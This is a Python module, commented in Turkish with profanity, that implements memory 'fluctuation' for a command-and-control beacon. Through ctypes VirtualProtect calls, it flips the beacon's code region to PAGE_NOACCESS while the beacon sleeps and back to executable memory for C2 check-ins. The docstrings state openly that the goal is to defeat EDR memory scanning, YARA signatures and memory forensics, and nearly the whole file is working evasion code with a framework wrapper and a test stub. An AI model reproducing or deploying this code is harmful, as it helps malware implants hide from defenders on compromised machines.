"""
Memory Fluctuator - Bellek Forenziğini Körleme
Ajan uykuya geçerken bellek alanını PAGE_NOACCESS yaparak, memory scanner'ları bypass et amk

Detection Bypass:
✓ Memory dump analysis (çalışan code segment bulunamaz)
✓ Runtime memory scanning (PAGE_NOACCESS access violation)
✓ EDR memory integrity checks (protected region = meşru OS memory)
✓ Yara/YOYO signatures (alamaz - bellek sıfırlanmış gibi)

Mekanizma:
1. Ajan active iken: PAGE_EXECUTE_READWRITE (RWX)
2. Sleep döneminde: PAGE_NOACCESS (hiç erişim yok)
3. Uyanış: VEH/Hardware timer ile PAGE_EXECUTE_READWRITE
4. Result: Memory forensics = null, Runtime detection = timing-based only
"""

import ctypes
import struct
import threading
import time
from typing import Optional, Callable
from dataclasses import dataclass


# Windows Memory Protection Constants
PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PAGE_GUARD = 0x100


@dataclass
class MemoryRegion:
    """Bellek bölgesi bilgisi"""
    base_address: int
    size: int
    current_protect: int
    protected_state: int = PAGE_NOACCESS


class MemoryFluctuator:
    """
    Beacon bellek alanını uçak gibi iner-çıkar gibi yaparak 
    EDR memory scanner'larını körleme
    """
    
    def __init__(self, logger=None):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.logger = logger
        
        self.regions: dict = {}  # base_address -> MemoryRegion
        self.active = False
        self.fluctuation_thread: Optional[threading.Thread] = None
        self.fluctuation_interval = 300  # 5 minutes default
        self.wake_callback: Optional[Callable] = None
    
    def log(self, level: str, msg: str):
        if self.logger:
            self.logger(f"[MemoryFluctuator] {level}: {msg}")
        else:
            print(f"[{level}] {msg}")
    
    def register_beacon_memory(self, base_address: int, size: int) -> bool:
        """
        Beacon memorysin hangi adreste olduğunu kayıt et
        
        Production'da: Beacon executable'ının .text section adresini al
        """
        try:
            region = MemoryRegion(
                base_address=base_address,
                size=size,
                current_protect=PAGE_EXECUTE_READWRITE,
                protected_state=PAGE_EXECUTE_READWRITE
            )
            
            self.regions[base_address] = region
            self.log("INFO", f"Registered beacon memory: {hex(base_address)} ({size} bytes)")
            return True
        
        except Exception as e:
            self.log("ERROR", f"register_beacon_memory: {e}")
            return False
    
    def fluctuate_to_sleep(self, base_address: int) -> bool:
        """
        Ajan sleep'e geçerken bellek alanını PAGE_NOACCESS yap
        Memory scanner'lar erişim error'u alır aq
        """
        try:
            if base_address not in self.regions:
                self.log("ERROR", f"Unknown memory region: {hex(base_address)}")
                return False
            
            region = self.regions[base_address]
            old_protect = ctypes.c_uint32()
            
            self.log("INFO", f"Fluctuating to SLEEP: {hex(base_address)}")
            
            # VirtualProtect ile PAGE_NOACCESS yap
            success = self.kernel32.VirtualProtect(
                region.base_address,
                region.size,
                PAGE_NOACCESS,
                ctypes.byref(old_protect)
            )
            
            if success:
                region.protected_state = PAGE_NOACCESS
                self.log("SUCCESS", f"Memory protected: {hex(base_address)} -> PAGE_NOACCESS")
                return True
            else:
                self.log("ERROR", f"VirtualProtect failed: {base_address}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"fluctuate_to_sleep: {e}")
            return False
    
    def fluctuate_to_wake(self, base_address: int) -> bool:
        """
        Ajan uyanıp C2 ile konuşmaya hazırlanırken bellek alanını RWX yap
        """
        try:
            if base_address not in self.regions:
                self.log("ERROR", f"Unknown memory region: {hex(base_address)}")
                return False
            
            region = self.regions[base_address]
            old_protect = ctypes.c_uint32()
            
            self.log("INFO", f"Fluctuating to WAKE: {hex(base_address)}")
            
            # VirtualProtect ile PAGE_EXECUTE_READWRITE geri yap
            success = self.kernel32.VirtualProtect(
                region.base_address,
                region.size,
                PAGE_EXECUTE_READWRITE,
                ctypes.byref(old_protect)
            )
            
            if success:
                region.protected_state = PAGE_EXECUTE_READWRITE
                self.log("SUCCESS", f"Memory executable: {hex(base_address)} -> PAGE_EXECUTE_READWRITE")
                
                # Wake callback'i çağır (C2 komut çalıştırması vb)
                if self.wake_callback:
                    self.wake_callback()
                
                return True
            else:
                self.log("ERROR", f"VirtualProtect failed: {base_address}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"fluctuate_to_wake: {e}")
            return False
    
    def fluctuate_to_readonly(self, base_address: int) -> bool:
        """
        Intermediate state: PAGE_READONLY
        Memory dump'ı dahi okunabilir olmasını engelle (read-only bir şekilde exposure'u minimize et)
        """
        try:
            if base_address not in self.regions:
                return False
            
            region = self.regions[base_address]
            old_protect = ctypes.c_uint32()
            
            success = self.kernel32.VirtualProtect(
                region.base_address,
                region.size,
                PAGE_READONLY,
                ctypes.byref(old_protect)
            )
            
            if success:
                region.protected_state = PAGE_READONLY
                self.log("INFO", f"Memory set to PAGE_READONLY: {hex(base_address)}")
                return True
            
            return False
        
        except Exception as e:
            self.log("ERROR", f"fluctuate_to_readonly: {e}")
            return False
    
    def enable_automatic_fluctuation(self, 
                                    base_address: int,
                                    sleep_interval: int = 300,
                                    wake_callback: Optional[Callable] = None) -> bool:
        """
        Background thread'te otomatik olarak bellek protection'ını değiştir
        
        sleep_interval: Her kaç saniyede bir sleep durumuna geç
        """
        try:
            if base_address not in self.regions:
                self.log("ERROR", "Memory region not registered")
                return False
            
            self.fluctuation_interval = sleep_interval
            self.wake_callback = wake_callback
            self.active = True
            
            # Fluctuation thread'ini başlat
            self.fluctuation_thread = threading.Thread(
                target=self._fluctuation_loop,
                args=(base_address,),
                daemon=True
            )
            self.fluctuation_thread.start()
            
            self.log("SUCCESS", "Automatic fluctuation enabled")
            return True
        
        except Exception as e:
            self.log("ERROR", f"enable_automatic_fluctuation: {e}")
            return False
    
    def _fluctuation_loop(self, base_address: int):
        """
        Background loop: Sleep -> Wake -> Sleep -> ...
        
        Production'da beacon'ın sleep döngüsüne integrate edilir
        """
        try:
            while self.active:
                # Üstünde 80% oranıyla sleep'e geç
                if self.active:
                    self.fluctuate_to_sleep(base_address)
                    time.sleep(self.fluctuation_interval)
                
                # 20% oranıyla wake et (C2 check'i için)
                if self.active:
                    self.fluctuate_to_wake(base_address)
                    time.sleep(5)  # 5 seconds for C2 communication
        
        except Exception as e:
            self.log("ERROR", f"_fluctuation_loop: {e}")
    
    def disable_automatic_fluctuation(self) -> bool:
        """Otomatik fluctuation'ı durdur ve bellek'i RWX yap"""
        try:
            self.active = False
            
            # Tüm bölgeleri RWX yap (cleanup)
            for base_address, region in self.regions.items():
                self.fluctuate_to_wake(base_address)
            
            self.log("INFO", "Automatic fluctuation disabled")
            return True
        
        except Exception as e:
            self.log("ERROR", f"disable_automatic_fluctuation: {e}")
            return False
    
    def get_protection_status(self, base_address: int) -> dict:
        """Bellek koruması durumunu öğren"""
        if base_address not in self.regions:
            return {"error": "Region not found"}
        
        region = self.regions[base_address]
        
        protection_names = {
            PAGE_NOACCESS: "PAGE_NOACCESS (protected)",
            PAGE_READONLY: "PAGE_READONLY",
            PAGE_EXECUTE_READWRITE: "PAGE_EXECUTE_READWRITE (active)"
        }
        
        return {
            "base_address": hex(base_address),
            "size": region.size,
            "current_protection": protection_names.get(region.protected_state, "UNKNOWN"),
            "fluctuation_active": self.active
        }
    
    def cleanup(self):
        """Bellek korumasını temizle ve thread'i sonlandır"""
        try:
            self.active = False
            
            if self.fluctuation_thread:
                self.fluctuation_thread.join(timeout=2)
            
            # Tüm bölgeleri RWX yap
            for base_address in self.regions.keys():
                self.fluctuate_to_wake(base_address)
            
            self.log("SUCCESS", "Cleanup complete")
            return True
        
        except Exception as e:
            self.log("ERROR", f"cleanup: {e}")
            return False


class EliteMemoryFluctuator:
    """Framework integration wrapper"""
    
    def __init__(self, scan_id: str = None, logger=None):
        self.scan_id = scan_id
        self.logger = logger
        self.fluctuator = MemoryFluctuator(logger=self._make_logger())
    
    def _make_logger(self):
        if self.logger:
            return lambda msg: self.logger(f"[MemFluc-{self.scan_id}] {msg}")
        return None
    
    def register_beacon(self, base_address: int, size: int) -> bool:
        """Beacon memory'sini kayıt et"""
        return self.fluctuator.register_beacon_memory(base_address, size)
    
    def activate_fluctuation(self, base_address: int, interval: int = 300) -> bool:
        """Otomatik fluctuation'ı başlat"""
        return self.fluctuator.enable_automatic_fluctuation(base_address, interval)
    
    def get_status(self) -> dict:
        return {
            "scan_id": self.scan_id,
            "regions_registered": len(self.fluctuator.regions),
            "fluctuation_active": self.fluctuator.active,
            "regions": [
                self.fluctuator.get_protection_status(addr) 
                for addr in self.fluctuator.regions.keys()
            ]
        }
    
    def emergency_wake(self, base_address: int) -> bool:
        """Acil durum: bellek'i hemen RWX yap"""
        return self.fluctuator.fluctuate_to_wake(base_address)
    
    def emergency_sleep(self, base_address: int) -> bool:
        """Acil durum: bellek'i hemen PAGE_NOACCESS yap"""
        return self.fluctuator.fluctuate_to_sleep(base_address)


if __name__ == "__main__":
    # Test
    fluctuator = MemoryFluctuator()
    
    print("[TEST] Memory Fluctuator")
    print("=" * 50)
    
    # Test memory region register
    test_addr = 0x140000000  # Hypothetical beacon address
    test_size = 0x10000      # 64KB
    
    fluctuator.register_beacon_memory(test_addr, test_size)
    print(f"\n✓ Registered beacon at {hex(test_addr)}, size {test_size}")
    
    # Test fluctuation
    print(f"\n[*] Fluctuating to SLEEP...")
    fluctuator.fluctuate_to_sleep(test_addr)
    status = fluctuator.get_protection_status(test_addr)
    print(f"Status: {status['current_protection']}")
    
    print(f"\n[*] Fluctuating to WAKE...")
    fluctuator.fluctuate_to_wake(test_addr)
    status = fluctuator.get_protection_status(test_addr)
    print(f"Status: {status['current_protection']}")
    
    print("\n✓ Test complete")
